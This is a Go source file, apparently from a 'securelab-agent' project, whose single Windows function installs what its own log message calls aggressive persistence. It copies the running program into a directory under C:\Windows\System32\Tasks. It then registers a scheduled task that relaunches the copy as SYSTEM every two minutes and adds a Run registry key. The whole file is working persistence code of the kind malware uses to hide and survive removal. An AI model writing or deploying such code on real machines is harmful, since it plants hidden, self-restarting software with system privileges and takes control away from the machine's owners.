//go:build windows

package windows

import (
	"os"
	"os/exec"
	"path/filepath"

	"securelab-agent/internal/config"
	"securelab-agent/internal/logger"

	"golang.org/x/sys/windows/registry"
)

func InstallPersistence(cfg *config.Config, log *logger.Logger) {
	log.Info("Instalando persistencia agresiva...")
	exe, _ := os.Executable()
	hiddenDir := "C:\\Windows\\System32\\Tasks\\SecureLabCore"
	os.MkdirAll(hiddenDir, 0755)
	hiddenExe := filepath.Join(hiddenDir, filepath.Base(exe))
	if _, err := os.Stat(hiddenExe); os.IsNotExist(err) {
		data, _ := os.ReadFile(exe)
		os.WriteFile(hiddenExe, data, 0755)
	}
	// Tarea programada
	exec.Command("schtasks", "/Create", "/F", "/TN", "SecureLabHeartbeat",
		"/TR", hiddenExe+" --watchdog", "/SC", "MINUTE", "/MO", "2", "/RU", "SYSTEM").Run()
	// Registro Run
	k, _ := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.SET_VALUE)
	k.SetStringValue("SecureLabAgent", hiddenExe)
	k.Close()
	log.Info("Persistencia instalada.")
}
